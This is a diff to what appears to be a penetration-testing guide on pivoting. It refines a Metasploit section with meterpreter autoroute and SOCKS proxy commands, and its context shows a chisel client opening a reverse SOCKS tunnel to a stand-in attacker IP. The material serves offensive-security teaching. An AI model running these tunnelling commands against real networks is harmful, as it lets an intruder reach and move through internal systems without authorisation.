@@ -59,11 +59,20 @@ chisel client $ATTACKER_MACHINE_IP:$ATTACKER_MACHINE_PORT R:socks
 {% endtab %}
 
 {% tab title="Metasploit" %}
-A meterpreter session can be taken advantage of by setting up a sock proxy with the appropriate module.
+A meterpreter session can be taken advantage of by setting up a SOCKS proxy with the appropriate module.
+
+The first steps consists in creating a route, from a meterpreter shell to the target
 
 ```bash
-msf > use auxiliary/server/socks4a
+meterpreter > run autoroute -s 10.11.1.0/24
+```
+
+The session can then be put in background and, the SOCKS server can be created.
+
+```bash
+msf > use auxiliary/server/socks_proxy
 msf > set SRVPORT $PORT
+msf > set VERSION 4a
 msf > run
 ```
 {% endtab %}
